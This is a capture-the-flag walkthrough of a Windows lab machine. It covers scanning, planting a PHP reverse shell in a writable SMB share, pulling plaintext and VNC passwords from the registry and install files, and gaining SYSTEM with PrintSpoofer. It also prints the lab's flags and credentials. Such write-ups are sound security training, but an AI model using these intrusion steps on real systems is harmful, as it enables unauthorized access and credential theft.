> AllSignsPoint2Pwnage

# Nmap

nmap -sC -sV -T4 -Pn -A -vvv -p- $IP -oN nmap/initial

```bash
21/tcp    open  ftp           syn-ack Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_11-14-20  04:26PM                  173 notice.txt
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          syn-ack Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
|_http-title: Simple Slide Show
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      syn-ack Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
|_http-title: Simple Slide Show
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
445/tcp   open  microsoft-ds? syn-ack
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: DESKTOP-997GG7D
|   NetBIOS_Domain_Name: DESKTOP-997GG7D
|   NetBIOS_Computer_Name: DESKTOP-997GG7D
|   DNS_Domain_Name: DESKTOP-997GG7D
|   DNS_Computer_Name: DESKTOP-997GG7D
|   Product_Version: 10.0.18362
|_  System_Time: 2021-05-24T08:02:35+00:00
| ssl-cert: Subject: commonName=DESKTOP-997GG7D
| Issuer: commonName=DESKTOP-997GG7D
5040/tcp  open  unknown       syn-ack
5900/tcp  open  vnc           syn-ack VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     Ultra (17)
|_    VNC Authentication (2)
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

# Gobuster

gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -q -o gobuster/initial

```bash
/img                  (Status: 301) [Size: 337] [--> http://10.10.244.229/img/]
/Images               (Status: 301) [Size: 340] [--> http://10.10.244.229/Images/]
/examples             (Status: 503) [Size: 403]                                   
/licenses             (Status: 403) [Size: 422]                                   
/dashboard            (Status: 301) [Size: 343] [--> http://10.10.244.229/dashboard/]
/IMAGES               (Status: 301) [Size: 340] [--> http://10.10.244.229/IMAGES/]   
/%20                  (Status: 403) [Size: 303]                                      
/IMG                  (Status: 301) [Size: 337] [--> http://10.10.244.229/IMG/]      
/*checkout*           (Status: 403) [Size: 303]                                      
/Img                  (Status: 301) [Size: 337] [--> http://10.10.244.229/Img/]      
/phpmyadmin           (Status: 403) [Size: 303]                                      
/webalizer            (Status: 403) [Size: 303]                                      
/*docroot*            (Status: 403) [Size: 303]                                      
/*                    (Status: 403) [Size: 303]                                      
/con                  (Status: 403) [Size: 303]                                      
/Dashboard            (Status: 301) [Size: 343] [--> http://10.10.244.229/Dashboard/]
/http%3A              (Status: 403) [Size: 303]                                      
/**http%3a            (Status: 403) [Size: 303]                                      
/*http%3A             (Status: 403) [Size: 303]                                      
/xampp                (Status: 301) [Size: 339] [--> http://10.10.244.229/xampp/]    
/**http%3A            (Status: 403) [Size: 303]                                      
/%C0                  (Status: 403) [Size: 303]                                      
/server-status        (Status: 403) [Size: 422]                                      
/%3FRID%3D2671        (Status: 403) [Size: 303]                                      
/devinmoore*          (Status: 403) [Size: 303]                                      
/200109*              (Status: 403) [Size: 303]                                      
/*dc_                 (Status: 403) [Size: 303]                                      
/*sa_                 (Status: 403) [Size: 303]                    
```

# FTP Anonymous Login - Allowed <notice.txt>

# notice.txt

```
NOTICE
======

Due to customer complaints about using FTP we have now moved 'images' to 
a hidden windows file share for upload and management 
of images.

- Dev Team
```

# SMB

smbclient -L //$IP

```bash
Enter WORKGROUP\n00bmast3r's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	images$         Disk      <Writable>
	Installs$       Disk      
	IPC$            IPC       Remote IPC
	Users           Disk      
```

Let's try to put a reverse shell in `images$` share since the share is writable. Since we know the application is running PHP7.4.1 we can narrow our path. Also we can confirm that it is XAMPP so we have to get a reversehell for windows with XAMPP. Thankfully we got `https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/php_reverse_shell.php`

Let's put shell.php in `images$` share and accessing `http://10.10.244.229/Images/shell.php` got us a shell!

# user_flag.txt

```
thm{48u51n9_5y573m_func710n4117y_f02_fun_4nd_p20f17}
```

Now we are asked for Password of sign. Plain text passwords are stored in registry keys. And hint says `The user is automatically logged into the computer`. Let's use reg query.

reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"

```cmd
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x18054b5f1
    ShutdownFlags    REG_DWORD    0x13
    DisableLockWorkstation    REG_DWORD    0x0
    EnableFirstLogonAnimation    REG_DWORD    0x1
    AutoLogonSID    REG_SZ    S-1-5-21-201290883-77286733-747258586-1001
    LastUsedUsername    REG_SZ    .\sign
    DefaultUsername    REG_SZ    .\sign
    DefaultPassword    REG_SZ    gKY1uxHLuU1zzlI4wwdAcKUw35TPMdv7PAEE5dAFbV2NxpPJVO7eeSH => `Password`
    AutoAdminLogon    REG_DWORD    0x1
    ARSOUserConsent    REG_DWORD    0x0

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey
```

And we got the password. Looking at C: we got Installs folder.

```
Directory of C:\Installs

14/11/2020  16:37    <DIR>          .
14/11/2020  16:37    <DIR>          ..
14/11/2020  16:40               548 Install Guide.txt
14/11/2020  16:19               800 Install_www_and_deploy.bat <2>
14/11/2020  14:59           339,096 PsExec.exe
14/11/2020  15:28    <DIR>          simepleslide
14/11/2020  15:01               182 simepleslide.zip
14/11/2020  16:14               147 startup.bat
14/11/2020  15:43             1,292 ultravnc.ini <2>
14/11/2020  15:00         3,129,968 UltraVNC_1_2_40_X64_Setup.exe
14/11/2020  14:59       162,450,672 xampp-windows-x64-7.4.11-0-VC15-installer.exe
```

We got 2 interesting files <1> and <2>. 

# Install_www_and_deploy.bat

```bat
@echo off
REM Shop Sign Install Script 
cd C:\Installs
psexec -accepteula -nobanner -u administrator -p RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi xampp-windows-x64-7.4.11-0-VC15-installer.exe   --disable-components xampp_mysql,xampp_filezilla,xampp_mercury,xampp_tomcat,xampp_perl,xampp_phpmyadmin,xampp_webalizer,xampp_sendmail --mode unattended --launchapps 1
xcopy C:\Installs\simepleslide\src\* C:\xampp\htdocs\
move C:\xampp\htdocs\index.php C:\xampp\htdocs\index.php_orig
copy C:\Installs\simepleslide\src\slide.html C:\xampp\htdocs\index.html
mkdir C:\xampp\htdocs\images
UltraVNC_1_2_40_X64_Setup.exe /silent
copy ultravnc.ini "C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini" /y
copy startup.bat "c:\programdata\Microsoft\Windows\Start Menu\Programs\Startup\"
pause
```

Oooh!🔥 We got Admin password.

# ultravnc.ini

```
[ultravnc]
passwd=B3A8F2D8BEA2F1FA70
passwd2=5AB2CDC0BADCAF13F1
[admin]
UseRegistry=0
SendExtraMouse=1
Secure=0
MSLogonRequired=0
NewMSLogon=0
DebugMode=0
Avilog=0
path=C:\Program Files\uvnc bvba\UltraVNC
accept_reject_mesg=
DebugLevel=0
DisableTrayIcon=0
rdpmode=0
noscreensaver=0
LoopbackOnly=0
UseDSMPlugin=0
AllowLoopback=1
AuthRequired=1
ConnectPriority=1
DSMPlugin=
AuthHosts=
DSMPluginConfig=
AllowShutdown=1
AllowProperties=1
AllowInjection=0
AllowEditClients=1
FileTransferEnabled=0
FTUserImpersonation=1
BlankMonitorEnabled=1
BlankInputsOnly=0
DefaultScale=1
primary=1
secondary=0
SocketConnect=1
HTTPConnect=1
AutoPortSelect=1
PortNumber=5900
HTTPPortNumber=5800
IdleTimeout=0
IdleInputTimeout=0
RemoveWallpaper=0
RemoveAero=0
QuerySetting=2
QueryTimeout=10
QueryDisableTime=0
QueryAccept=0
QueryIfNoLogon=1
InputsEnabled=1
LockSetting=0
LocalInputsDisabled=0
EnableJapInput=0
EnableUnicodeInput=0
EnableWin8Helper=0
kickrdp=0
clearconsole=0
[admin_auth]
group1=
group2=
group3=
locdom1=0
locdom2=0
locdom3=0
[poll]
TurboMode=1
PollUnderCursor=0
PollForeground=0
PollFullScreen=1
OnlyPollConsole=0
OnlyPollOnEvent=0
MaxCpu=40
EnableDriver=0
EnableHook=1
EnableVirtual=0
SingleWindow=0
SingleWindowName=
```

We have encrypted password as from the hint we got a decoder in .exe format. To run in linux let's use wine.

wine vncpwd.exe B3A8F2D8BEA2F1FA70

```bash
*VNC password decoder 0.2.1
by Luigi Auriemma
e-mail: aluigi@autistici.org
web:    aluigi.org

- your input password seems in hex format (or longer than 8 chars)

  Password:   5upp0rt9
```

# Privilege Escalation

whomai /priv

```cmd
Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled  => Wowsers🤡
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

We can put put printerspoofer.exe in SMB and access it in `C:\xampp\htdocs\images`. 

PrintSpoofer64.exe -i -c cmd => And we are `nt authority\system`.

# admin_flag.txt

```
thm{p455w02d_c4n_83_f0und_1n_p141n_73x7_4dm1n_5c21p75}
```